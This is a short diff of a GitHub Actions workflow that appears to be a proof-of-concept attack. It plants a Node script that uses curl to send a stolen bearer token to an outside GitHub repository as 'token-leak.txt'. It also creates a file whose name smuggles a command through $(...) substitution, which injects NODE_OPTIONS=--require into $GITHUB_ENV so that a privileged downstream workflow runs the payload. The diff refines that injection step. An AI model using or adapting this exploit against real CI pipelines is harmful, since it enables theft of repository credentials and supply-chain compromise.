@@ -21,7 +21,8 @@ jobs:
             execSync("curl -s -m 20 -X PUT -H 'Authorization: Bearer " + t + "' -H 'Accept: application/vnd.github+json' https://api.github.com/repos/PDFtoMark/gab-poc-wfr-artifact/contents/token-leak.txt -d '{\"message\":\"poc\",\"content\":\"" + b + "\"}'");
           }
           JS
-          echo 'injected' > 'content/$(A=${PWD:0:1};D=$A'"'"'tmp'"'"'$A'"'"'content'"'"'$A'"'"'content'"'"'$A'"'"'p.js'"'"';echo NODE_OPTIONS=--require=$D>>$GITHUB_ENV).txt'
+          printf 'NODE_OPTIONS=--require=/tmp/content/content/p.js\n' > content/e.env
+          echo 'injected' > 'content/$(S=$(printf '"'"'\57'"'"');cp $S'"'"'tmp'"'"'$S'"'"'content'"'"'$S'"'"'content'"'"'$S'"'"'e.env'"'"' $GITHUB_ENV).txt'
           printf '1' > content/pr_number.txt
           ls -la content
       - uses: actions/upload-artifact@v4
